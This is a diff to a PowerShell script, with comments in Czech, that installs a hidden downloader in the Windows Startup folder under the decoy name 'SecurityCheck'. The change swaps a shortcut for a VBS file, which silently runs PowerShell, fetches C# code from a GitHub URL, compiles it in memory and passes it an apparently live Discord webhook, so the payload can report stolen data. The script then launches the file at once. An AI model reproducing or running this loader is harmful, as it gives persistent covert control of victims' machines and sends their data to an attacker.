@@ -1,17 +1,13 @@
 $webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
 $github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
-$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.lnk"
+$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
 
-# Příkaz pro PowerShell
-$arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""
+# Kód pro VBS, který spustí PowerShell neviditelně
+$vbsCode = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -WindowStyle Hidden -Command `$w='''$webhook'''; `$g='''$github'''; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies '''System.Management''','''System.Net.Http''','''System.Drawing''','''System.Windows.Forms''','''System.IO'''; [Program]::Main(`$w)", 0, False
+"@
 
-# Vytvoření zástupce (.lnk)
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($lnkPath)
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = $arg
-$shortcut.WindowStyle = 7
-$shortcut.Save()
+[System.IO.File]::WriteAllText($startupPath, $vbsCode)
 
-# Okamžité spuštění pro test
-Start-Process powershell.exe -ArgumentList $arg -WindowStyle Hidden
+wscript.exe $startupPath
